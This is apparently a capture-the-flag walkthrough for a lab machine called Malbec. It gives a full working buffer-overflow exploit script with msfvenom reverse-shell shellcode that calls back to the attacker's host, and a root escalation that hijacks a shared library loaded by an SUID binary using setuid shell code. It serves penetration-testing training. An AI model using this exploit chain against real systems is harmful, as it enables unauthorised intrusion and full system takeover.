# Malbec Walkthrough
### Summary

In this walkthrough, we will exploit the target via a remote stack-based buffer overflow vulnerability in a custom Windows executable. We'll then escalate via dynamic library hijacking of an SUID Linux binary.

### Enumeration
We'll begin with an nmap scan against all TCP ports.
```bash
┌──(kali㉿kali)-[~]
└─$ sudo nmap -p- 192.168.120.149             
Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-27 08:02 EST
Nmap scan report for 192.168.120.149
Host is up (0.036s latency).
Not shown: 65478 closed ports, 54 filtered ports
PORT     STATE SERVICE
22/tcp   open  ssh
2121/tcp open  ccproxy-ftp
7138/tcp open  unknown
```
We discover an SSH service on port 22, what looks to be an FTP server running on port 2121, and an unknown service on port 7138. Let's run a deeper scan against ports 2121 and 7138.
```bash
┌──(kali㉿kali)-[~]
└─$ sudo nmap -p 2121,7138 -sC -sV 192.168.120.149
Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-27 08:19 EST
Nmap scan report for 192.168.120.149
Host is up (0.031s latency).

PORT     STATE SERVICE VERSION
2121/tcp open  ftp     pyftpdlib 1.5.6
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rwxrwxrwx   1 carlos   carlos     108304 Jan 25 17:01 malbec.exe [NSE: writeable]
| ftp-syst: 
|   STAT: 
| FTP server status:
|  Connected to: 192.168.120.149:2121
|  Waiting for username.
|  TYPE: ASCII; STRUcture: File; MODE: Stream
|  Data connection closed.
|_End of status.
7138/tcp open  unknown
```

The results indicate that the service on port 2121 is pyftpdlib v1.5.6. Anonymous login is enabled, and the FTP root directory contains a malbec.exe file owned by carlos. Unfortunately, there is no additional information about the service on port 7138.

Since anonymous login is allowed, let's connect and retrieve that file. Our FTP client reports that the target system is Unix-based, which is very interesting since the malbec.exe binary appears to be a Windows executable. Let's launch an OS fingerprinting scan against the target and see if nmap can shed some light on this discrepancy.

```bash
┌──(kali㉿kali)-[~]
└─$ sudo nmap 192.168.120.149 -O                  
Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-27 08:27 EST
Nmap scan report for 192.168.120.149
Host is up (0.030s latency).
Not shown: 998 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
2121/tcp open  ccproxy-ftp
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
```

Unfortunately, nmap is unable to detect the operating system. If our FTP client's OS guess is correct, then the target may be using software like Wine to run Windows .exe binaries. Wine is an open-source compatibility layer that can run Windows applications on Unix-like operating systems. Let's retrieve malbec.exe for further inspection.
```bash
ftp> passive
Passive mode on.
ftp> ls
227 Entering passive mode (192,168,120,149,153,253).
125 Data connection already open. Transfer starting.
-rwxrwxrwx   1 carlos   carlos     108304 Jan 25 17:01 malbec.exe
226 Transfer complete.
ftp> binary
200 Type set to: Binary.
ftp> get malbec.exe
local: malbec.exe remote: malbec.exe
227 Entering passive mode (192,168,120,149,134,245).
125 Data connection already open. Transfer starting.
226 Transfer complete.
108304 bytes received in 0.11 secs (1006.9177 kB/s)
ftp> quit
221 Goodbye.
```                                                                                                                                           
```bash                                       
┌──(kali㉿kali)-[~]
└─$ ls -l malbec.exe  
-rw-r--r-- 1 kali kali 108304 Jan 27 08:24 malbec.exe
```

### Windows Binary Analysis

Let's run this binary through wine.
```bash 
┌──(kali㉿kali)-[~]
└─$ which wine  
/usr/bin/wine
```
This generates dependency errors. Before we can proceed, we need to install the wine32 package.
```bash 
┌──(kali㉿kali)-[~]
└─$ sudo dpkg --add-architecture i386

┌──(kali㉿kali)-[~]
└─$ sudo apt-get update && sudo apt-get install wine32 -y
```

After installation, we should be able to run the binary with wine. Before we do this, let's check the open ports on our attack machine in case this binary is some type of server software.
```bash 
┌──(kali㉿kali)-[~]
└─$ sudo netstat -tlpn
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
                                                                                                                                                                                        
```

We have no listening ports which is obviously the best security posture for an attack machine. Let's run the binary.
```bash 
┌──(kali㉿kali)-[~]
└─$ sudo wine malbec.exe                                                                      
[+] Malbec started!
[*] Waiting for incoming connections!
```

Nothing seems to have happened. However, let's check our open ports again:
```bash 
┌──(kali㉿kali)-[~]
└─$ sudo netstat -tlpn
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:7138            0.0.0.0:*               LISTEN      4851/malbec.exe     
```

This is interesting. We see that the server is now listening for incoming connections on TCP port 7138, which is one of the ports that was open in the initial target scan. We can speculate that this binary is running on the target.
Exploitation
Buffer Overflow Vulnerability

This binary suffers from a stack-based buffer overflow vulnerability. To proceed with the attack, we need to have a working understanding of Windows exploit development basics. The process will include fuzzing, instruction pointer control, stack pointer return address identification, bad character mitigation, etc.

Fortunately for us, ASLR is not enabled on the target system, and the binary was not compiled with DEP. As we develop our proof-of-concept exploit code, we discover the following:

    The instruction pointer (EIP) is overwritten at the offset of 340 bytes.
    To reach our payload, the instruction sequence of PUSH ESP --> RET is located at address 0x41101503.
    The only bad character that could mangle our payload is the null byte (0x00).

Let's create a reverse shell payload to include in our PoC script.
```bash 
┌──(kali㉿kali)-[~]
└─$ msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.118.5 LPORT=2121 -f py -b "\x00" EXITFUNC=thread
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 95 (iteration=0)
x86/shikata_ga_nai chosen with final size 95
Payload size: 95 bytes
Final size of py file: 479 bytes
buf =  b""
buf += b"\xbb\xc8\x11\x6c\x9c\xda\xc2\xd9\x74\x24\xf4\x5d\x33"
buf += b"\xc9\xb1\x12\x83\xed\xfc\x31\x5d\x0e\x03\x95\x1f\x8e"
buf += b"\x69\x14\xfb\xb9\x71\x05\xb8\x16\x1c\xab\xb7\x78\x50"
buf += b"\xcd\x0a\xfa\x02\x48\x25\xc4\xe9\xea\x0c\x42\x0b\x82"
buf += b"\x4e\x1c\x9d\x57\x27\x5f\x62\x5f\xfe\xd6\x83\xef\x66"
buf += b"\xb9\x12\x5c\xd4\x3a\x1c\x83\xd7\xbd\x4c\x2b\x86\x92"
buf += b"\x03\xc3\x3e\xc2\xcc\x71\xd6\x95\xf0\x27\x7b\x2f\x17"
buf += b"\x77\x70\xe2\x58"
```
This is our final exploit script with our payload:
```python
#!/usr/bin/python3

import sys
import os
import socket
import struct


if len (sys.argv) != 2:
    print("[!] Insufficient amount of arguments.")
    print(f"[*] Usage: /usr/bin/python3 {sys.argv[0]} <host>")
    sys.exit (1)

host = sys.argv[1]


# msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.118.5 LPORT=2121 -f py -b "\x00" EXITFUNC=thread
# Payload size: 95 bytes

buf =  b""
buf += b"\xbb\xc8\x11\x6c\x9c\xda\xc2\xd9\x74\x24\xf4\x5d\x33"
buf += b"\xc9\xb1\x12\x83\xed\xfc\x31\x5d\x0e\x03\x95\x1f\x8e"
buf += b"\x69\x14\xfb\xb9\x71\x05\xb8\x16\x1c\xab\xb7\x78\x50"
buf += b"\xcd\x0a\xfa\x02\x48\x25\xc4\xe9\xea\x0c\x42\x0b\x82"
buf += b"\x4e\x1c\x9d\x57\x27\x5f\x62\x5f\xfe\xd6\x83\xef\x66"
buf += b"\xb9\x12\x5c\xd4\x3a\x1c\x83\xd7\xbd\x4c\x2b\x86\x92"
buf += b"\x03\xc3\x3e\xc2\xcc\x71\xd6\x95\xf0\x27\x7b\x2f\x17"
buf += b"\x77\x70\xe2\x58"

push_esp_ret = struct.pack("<I", 0x41101503)

buffer = b"A" * 340 + push_esp_ret + b"\x90" * 10 + buf + b"\xff" * 2000

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, 7138))
s.send(buffer)
s.recv(1024)
s.close()

print("[+] Payload sent. Check your listener...")
```
We'll set up a Netcat listener on port 2121 and launch our exploit.
```bash 
┌──(kali㉿kali)-[~]
└─$ python3 exploit.py 192.168.120.149
[+] Payload sent. Check your listener...
```
If all went according to plan, our listener should present us with a shell.
```bash 
┌──(kali㉿kali)-[~]
└─$ nc -lvp 2121               
listening on [any] 2121 ...
192.168.120.149: inverse host lookup failed: Unknown host
connect to [192.168.118.5] from (UNKNOWN) [192.168.120.149] 44478
python -c 'import pty; pty.spawn("/bin/bash")'
carlos@malbec:/home/carlos$ id
id
uid=1000(carlos) gid=1000(carlos) groups=1000(carlos)
````

# Privilege Escalation
### SUID Enumeration

Let's begin by detecting SUID binaries on the system.
```bash 
carlos@malbec:/home/carlos$ find / -perm -u=s -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/bin/mount
/usr/bin/passwd
/usr/bin/su
/usr/bin/fusermount
/usr/bin/umount
/usr/bin/messenger
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/newgrp
/usr/bin/sudo
/usr/bin/gpasswd
```
One binary of particular interest is `/usr/bin/messenger`.
```bash 
carlos@malbec:/home/carlos$ ls -l /usr/bin/messenger
ls -l /usr/bin/messenger
-rwsr-xr-x 1 root root 16600 Jan 26 04:43 /usr/bin/messenger
carlos@malbec:/home/carlos$ 
carlos@malbec:/home/carlos$ stat /usr/bin/messenger
stat /usr/bin/messenger
  File: /usr/bin/messenger
  Size: 16600           Blocks: 40         IO Block: 4096   regular file
Device: 801h/2049d      Inode: 287480      Links: 1
Access: (4755/-rwsr-xr-x)  Uid: (    0/    root)   Gid: (    0/    root)
Access: 2021-01-26 04:43:51.950471868 -0500
Modify: 2021-01-26 04:43:51.950471868 -0500
Change: 2021-01-26 04:43:51.954471620 -0500
 Birth: -
```
This binary has indeed been granted SUID privileges. Let's execute it and inspect its behavior.
```bash 
carlos@malbec:/home/carlos$ which messenger
which messenger
/usr/bin/messenger
carlos@malbec:/home/carlos$ messenger
messenger
messenger: error while loading shared libraries: libmalbec.so: cannot open shared object file: No such file or directory
```
This error tells us that a dynamic shared library libmalbec.so was searched for, but not found. We can confirm this by running ldd against the binary.
```bash 
carlos@malbec:/home/carlos$ ldd /usr/bin/messenger
ldd /usr/bin/messenger
        linux-vdso.so.1 (0x00007ffd1b693000)
        libmalbec.so => not found
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f25129de000)
        /lib64/ld-linux-x86-64.so.2 (0x00007f2512bb4000)
```

### Dynamic Library Hijacking

If we could write to the directory where the library is expected to be, we may be able to hijack the library call and execute arbitrary code. Let's inspect the /etc/ld.so.conf.d/ directory to determine which shared library configuration files are available.
```bash 
carlos@malbec:/home/carlos$ ls -l /etc/ld.so.conf.d/
ls -l /etc/ld.so.conf.d/
total 20
-rw-r--r-- 1 root root  38 Jun 25  2018 fakeroot-x86_64-linux-gnu.conf
-rw-r--r-- 1 root root 168 May  1  2019 i386-linux-gnu.conf
-rw-r--r-- 1 root root  44 Mar 20  2016 libc.conf
-rw-r--r-- 1 root root  14 Jan 26 04:43 malbec.conf
-rw-r--r-- 1 root root 100 May  1  2019 x86_64-linux-gnu.conf
```
The malbec.conf configuration file contains the following:
```bash 
carlos@malbec:/home/carlos$ cat /etc/ld.so.conf.d/malbec.conf
cat /etc/ld.so.conf.d/malbec.conf
/home/carlos/
```
The binary searches /home/carlos/ for the shared library. This is perfect for our purposes as /home/carlos/ is the home directory of our user, which means we should have no problem writing our malicious library.

The /etc/crontab file indicates that the /sbin/ldconfig dynamic linker process runs every two minutes and forces /usr/bin/messenger to search for libmalbec.so and link it if it is found.
```bash 
carlos@malbec:/home/carlos$ cat /etc/crontab
cat /etc/crontab
...
# *  *  *  *  * user-name command to be executed
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
*/2 * * * * root /sbin/ldconfig
```
Having obtained all this information, we should be able to abuse this functionality. We'll use the following basic root shell C code:
```c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
int main(void)
{
setuid(0); setgid(0); system("/bin/bash");
}
```
As this is a shared library, we must determine the method the calling method of the messenger binary. Before compiling our exploit, let's run strings on the binary to help gather clues about the name of our exploit method.
```bash 
carlos@malbec:/home/carlos$ strings /usr/bin/messenger
strings /usr/bin/messenger
/lib64/ld-linux-x86-64.so.2
...
_ITM_deregisterTMCloneTable
__gmon_start__
malbec
__libc_start_main
libmalbec.so
...
_ITM_registerTMCloneTable
malbec
__cxa_finalize@@GLIBC_2.2.5
...
```
The malbec string appears a couple of times in the output. Let's give this name a shot. To create our shell source code, we will issue the cat <<EOT >> rootshell.c command and then paste the following C code (including the newline character at the end) when presented with the > prompt:
```c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
void malbec() {
setuid(0); setgid(0); system("/bin/bash");
}
```
The process is as follows:
```bash 
carlos@malbec:/home/carlos$ cat <<EOT >> rootshell.c
cat <<EOT >> rootshell.c
> #include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
void malbec() {
setuid(0); setgid(0); system("/bin/bash");
}
#include <stdio.h>
> #include <sys/types.h>
> #include <unistd.h>
> void malbec() {
> setuid(0); setgid(0); system("/bin/bash");
> }
> 
```
Inputting EOT ends our input sequence and writes our code to the file.
```bash 
> EOT
EOT
carlos@malbec:/home/carlos$ 
carlos@malbec:/home/carlos$ cat rootshell.c                                       
cat rootshell.c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
void malbec() {
setuid(0); setgid(0); system("/bin/bash");
}
```
Compiling the source code now produces the following error:
```bash 
carlos@malbec:/home/carlos$ gcc rootshell.c -o libmalbec.so -shared -Wall -fPIC -w
< rootshell.c -o libmalbec.so -shared -Wall -fPIC -w
gcc: error trying to exec 'cc1': execvp: No such file or directory
```
Let's review our environment variables.
```bash 
carlos@malbec:/home/carlos$ export
export
declare -x LS_COLORS=""
declare -x OLDPWD
declare -x PWD="/home/carlos"
declare -x SHLVL="1"
carlos@malbec:/home/carlos$
```
It seems the PATH variable has not been exported. To fix this, we'll export this variable.
```bash 
carlos@malbec:/home/carlos$ export PATH
export PATH
carlos@malbec:/home/carlos$ export
export
declare -x LS_COLORS=""
declare -x OLDPWD
declare -x PATH="/usr/local/bin:/usr/local/sbin:/usr/bin:/usr/sbin:/bin:/sbin:."
declare -x PWD="/home/carlos"
declare -x SHLVL="1"
carlos@malbec:/home/carlos$
```
Let's try to compile again.
```bash 
carlos@malbec:/home/carlos$ gcc rootshell.c -o libmalbec.so -shared -Wall -fPIC -w
< rootshell.c -o libmalbec.so -shared -Wall -fPIC -w
carlos@malbec:/home/carlos$ ls -l libmalbec.so
ls -l libmalbec.so
-rwxr-xr-x 1 carlos carlos 16088 Jan 27 11:38 libmalbec.so
```
The compiler runs without further issues. Good. Remembering that ldconfig runs on a crontab schedule, we will wait two minutes for our library to be found. Then, we can test for successful linking of our malicious library with ldd.
```bash 
carlos@malbec:/home/carlos$ ldd /usr/bin/messenger
ldd /usr/bin/messenger
        linux-vdso.so.1 (0x00007ffd752d6000)
        libmalbec.so => /home/carlos/libmalbec.so (0x00007f498cc00000)
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f498ca3f000)
        /lib64/ld-linux-x86-64.so.2 (0x00007f498cc1a000)
```
Excellent. The process picked up our library. If we run the messenger binary, we should drop into a root shell:
```bash 
carlos@malbec:/home/carlos$ id
id
uid=1000(carlos) gid=1000(carlos) groups=1000(carlos)
carlos@malbec:/home/carlos$ messenger
messenger
root@malbec:/home/carlos# id
id
uid=0(root) gid=0(root) groups=0(root),1000(carlos)
```